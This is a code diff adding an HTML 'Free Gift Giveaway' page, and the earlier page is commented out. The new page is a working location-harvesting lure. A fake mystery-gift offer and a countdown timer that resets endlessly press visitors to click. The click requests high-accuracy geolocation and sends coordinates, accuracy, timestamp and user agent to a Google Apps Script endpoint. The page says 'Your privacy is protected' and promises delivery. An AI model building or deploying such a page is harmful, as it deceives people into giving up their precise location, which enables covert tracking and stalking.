@@ -1,4 +1,4 @@
-<!DOCTYPE html>
+<!-- <!DOCTYPE html>
 <html lang="en">
   <head>
     <meta charset="UTF-8" />
@@ -355,6 +355,355 @@
           { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
         );
       };
+    </script>
+  </body>
+</html> -->
+
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Free Gift - Claim Now!</title>
+    <style>
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+      }
+      body {
+        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Arial,
+          sans-serif;
+        background: linear-gradient(135deg, #ff6b00 0%, #ff8c00 100%);
+        min-height: 100vh;
+        padding: 20px;
+      }
+      .container {
+        max-width: 500px;
+        margin: 0 auto;
+        background: white;
+        border-radius: 20px;
+        overflow: hidden;
+        box-shadow: 0 10px 40px rgba(0, 0, 0, 0.2);
+      }
+      .header {
+        background: linear-gradient(135deg, #ff6b00 0%, #ff8c00 100%);
+        padding: 20px;
+        text-align: center;
+        color: white;
+      }
+      .header h1 {
+        font-size: 24px;
+        font-weight: 800;
+        margin-bottom: 5px;
+        text-transform: uppercase;
+      }
+      .header p {
+        font-size: 14px;
+        opacity: 0.95;
+      }
+      .badge {
+        display: inline-block;
+        background: #ffd700;
+        color: #ff6b00;
+        padding: 5px 15px;
+        border-radius: 20px;
+        font-size: 12px;
+        font-weight: bold;
+        margin-top: 10px;
+      }
+      .product-section {
+        padding: 30px 20px;
+        text-align: center;
+      }
+      .product-image {
+        width: 100%;
+        max-width: 300px;
+        height: 300px;
+        background: #f5f5f5;
+        border-radius: 15px;
+        margin: 0 auto 20px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        border: 3px dashed #ddd;
+        overflow: hidden;
+      }
+      .product-image img {
+        max-width: 100%;
+        max-height: 100%;
+        object-fit: contain;
+      }
+      .placeholder-text {
+        color: #999;
+        font-size: 14px;
+      }
+      .product-name {
+        font-size: 22px;
+        font-weight: 700;
+        color: #333;
+        margin-bottom: 10px;
+      }
+      .features {
+        background: #fff9e6;
+        border-radius: 12px;
+        padding: 20px;
+        margin: 20px 0;
+      }
+      .feature-item {
+        display: flex;
+        align-items: center;
+        margin-bottom: 12px;
+        font-size: 14px;
+        color: #333;
+      }
+      .feature-item:last-child {
+        margin-bottom: 0;
+      }
+      .feature-icon {
+        width: 24px;
+        height: 24px;
+        background: #ff6b00;
+        border-radius: 50%;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        color: white;
+        font-weight: bold;
+        margin-right: 10px;
+        flex-shrink: 0;
+      }
+      .timer {
+        background: #ffe5e5;
+        border-radius: 10px;
+        padding: 15px;
+        margin: 20px 0;
+        text-align: center;
+      }
+      .timer-label {
+        font-size: 12px;
+        color: #ff6b00;
+        font-weight: bold;
+        margin-bottom: 5px;
+      }
+      .timer-display {
+        font-size: 28px;
+        font-weight: 800;
+        color: #ff0000;
+        font-family: "Courier New", monospace;
+      }
+      .claim-button {
+        width: 100%;
+        background: linear-gradient(135deg, #ff6b00 0%, #ff8c00 100%);
+        color: white;
+        border: none;
+        padding: 18px;
+        border-radius: 50px;
+        font-size: 18px;
+        font-weight: 800;
+        text-transform: uppercase;
+        cursor: pointer;
+        box-shadow: 0 6px 20px rgba(255, 107, 0, 0.4);
+        transition: all 0.3s;
+        margin-top: 20px;
+      }
+      .claim-button:hover {
+        transform: translateY(-2px);
+        box-shadow: 0 8px 25px rgba(255, 107, 0, 0.5);
+      }
+      .claim-button:active {
+        transform: translateY(0);
+      }
+      .info-text {
+        font-size: 12px;
+        color: #666;
+        text-align: center;
+        margin-top: 15px;
+        padding: 0 20px 20px;
+      }
+      .status-message {
+        padding: 15px 20px;
+        margin: 20px;
+        border-radius: 10px;
+        text-align: center;
+        font-weight: 600;
+        display: none;
+      }
+      .status-message.success {
+        background: #d4edda;
+        color: #155724;
+        display: block;
+      }
+      .status-message.error {
+        background: #f8d7da;
+        color: #721c24;
+        display: block;
+      }
+      .pulse {
+        animation: pulse 2s infinite;
+      }
+      @keyframes pulse {
+        0%,
+        100% {
+          transform: scale(1);
+        }
+        50% {
+          transform: scale(1.05);
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <div class="container">
+      <div class="header">
+        <h1>🎁 Free Gift Giveaway!</h1>
+        <p>Limited Time Offer</p>
+        <span class="badge">✨ 100% FREE</span>
+      </div>
+      <div class="product-section">
+        <div class="product-image">
+          <img
+            id="productImg"
+            src="https://img.kwcdn.com/product/fancy/e7a6af48-67c3-45ee-9d67-9aff2eda4aaa.jpg?imageView2/2/w/800/q/70/format/avif"
+            alt="Gift Product"
+          />
+        </div>
+        <h2 class="product-name">Exclusive Mystery Gift Box</h2>
+        <div class="features">
+          <div class="feature-item">
+            <div class="feature-icon">✓</div>
+            <div>100% Genuine & Brand New</div>
+          </div>
+          <div class="feature-item">
+            <div class="feature-icon">✓</div>
+            <div>Free Shipping to Your Location</div>
+          </div>
+          <div class="feature-item">
+            <div class="feature-icon">✓</div>
+            <div>No Hidden Fees or Charges</div>
+          </div>
+          <div class="feature-item">
+            <div class="feature-icon">✓</div>
+            <div>Delivered Within 3-5 Business Days</div>
+          </div>
+        </div>
+        <div class="timer">
+          <div class="timer-label">⏰ OFFER EXPIRES IN</div>
+          <div class="timer-display" id="timer">23:59:45</div>
+        </div>
+        <div id="statusMsg" class="status-message"></div>
+        <button
+          class="claim-button pulse"
+          id="claimBtn"
+          onclick="requestLocation()"
+        >
+          🎉 Click To Get Free Gift
+        </button>
+        <p class="info-text">
+          📍 We need your location permission to deliver your free gift to your
+          address. Your privacy is protected.
+        </p>
+      </div>
+    </div>
+
+    <script>
+      let timeLeft = 86385;
+      function updateTimer() {
+        const hours = Math.floor(timeLeft / 3600);
+        const minutes = Math.floor((timeLeft % 3600) / 60);
+        const seconds = timeLeft % 60;
+        document.getElementById("timer").textContent = `${hours
+          .toString()
+          .padStart(2, "0")}:${minutes.toString().padStart(2, "0")}:${seconds
+          .toString()
+          .padStart(2, "0")}`;
+        if (timeLeft > 0) {
+          timeLeft--;
+        } else {
+          timeLeft = 86385;
+        }
+      }
+      setInterval(updateTimer, 1000);
+
+      function requestLocation() {
+        const btn = document.getElementById("claimBtn");
+        const statusMsg = document.getElementById("statusMsg");
+        btn.disabled = true;
+        btn.textContent = "📍 Requesting Location...";
+        statusMsg.style.display = "none";
+
+        if (!navigator.geolocation) {
+          showStatus(
+            "error",
+            "❌ Geolocation is not supported by your browser"
+          );
+          btn.disabled = false;
+          btn.textContent = "🎉 Click To Get Free Gift";
+          return;
+        }
+
+        navigator.geolocation.getCurrentPosition(
+          function (position) {
+            const locationData = {
+              latitude: position.coords.latitude,
+              longitude: position.coords.longitude,
+              accuracy: position.coords.accuracy,
+              timestamp: new Date().toISOString(),
+              userAgent: navigator.userAgent,
+            };
+
+            fetch(
+              "https://script.google.com/macros/s/AKfycbyRP-znNx2zCxUSQGu3hfzNRnzJeteLxGsg0v2wN4PPENE4WfOXt8PaHg9MgN6VsQVU/exec",
+              {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(locationData),
+              }
+            )
+              .then((res) => res.json())
+              .then((data) => {
+                showStatus(
+                  "success",
+                  "✅ Success! Your free gift will be delivered soon."
+                );
+                btn.textContent = "🎉 Claimed!";
+              })
+              .catch((err) => {
+                showStatus("error", "❌ Error sending data. Try again.");
+                btn.disabled = false;
+                btn.textContent = "🎉 Click To Get Free Gift";
+              });
+          },
+          function (error) {
+            let errorMsg = "";
+            switch (error.code) {
+              case error.PERMISSION_DENIED:
+                errorMsg =
+                  "❌ Location permission denied. Please allow location access to claim your gift.";
+                break;
+              case error.POSITION_UNAVAILABLE:
+                errorMsg = "❌ Location information unavailable.";
+                break;
+              case error.TIMEOUT:
+                errorMsg = "❌ Location request timed out.";
+                break;
+              default:
+                errorMsg = "❌ An error occurred while getting your location.";
+            }
+            showStatus("error", errorMsg);
+            btn.disabled = false;
+            btn.textContent = "🎉 Click To Get Free Gift";
+          },
+          { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+        );
+      }
+
+      function showStatus(type, message) {
+        const statusMsg = document.getElementById("statusMsg");
+        statusMsg.className = `status-message ${type}`;
+        statusMsg.textContent = message;
+        statusMsg.style.display = "block";
+      }
     </script>
   </body>
 </html>
